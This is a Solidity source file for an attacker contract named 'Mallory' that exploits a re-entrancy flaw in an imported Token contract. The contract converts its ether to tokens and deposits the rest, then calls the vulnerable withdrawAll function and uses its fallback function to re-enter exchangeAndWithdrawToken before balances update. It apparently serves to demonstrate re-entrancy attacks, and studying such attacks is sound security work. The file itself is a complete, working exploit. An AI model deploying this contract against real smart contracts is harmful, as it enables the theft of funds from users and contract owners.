pragma solidity "0.5.0";
import "./Token.sol";
contract Mallory {
    Token t;
    // this is used to stop the re-entrancy after the second time the Token
    // contract sends Ether to the Mallory contract.
    bool private abort;
    
    constructor(Token _t) public {
    // for solidity 0.4.19
    /*function Mallory(Token _t) public {*/
        t = _t;
        abort = false;
    }
    
    function deposit() public payable {}
    
    function setup() public payable {
        // exchange nearly all available ether to tokens
        uint avail = address(this).balance - 2;
        t.exchangeEther.value(avail)(avail);
        // deposit the last remaining ether
        t.depositEther.value(address(this).balance)();
    }
    
    function attack() public payable {
        // call vulnerable withdrawAll
        t.withdrawAll();
    }
    
    function () external payable {
        if (!abort) {
            // stop the second re-entrancy, which is caused by the transfer
            abort = true;  
            t.exchangeAndWithdrawToken(t.getTokenCount());
        }
    }
    
    event balanceLog(string, uint);
    function getBalance() public returns(uint) {
        emit balanceLog("attack contract balance: ", address(this).balance);
        return address(this).balance;
    }
}
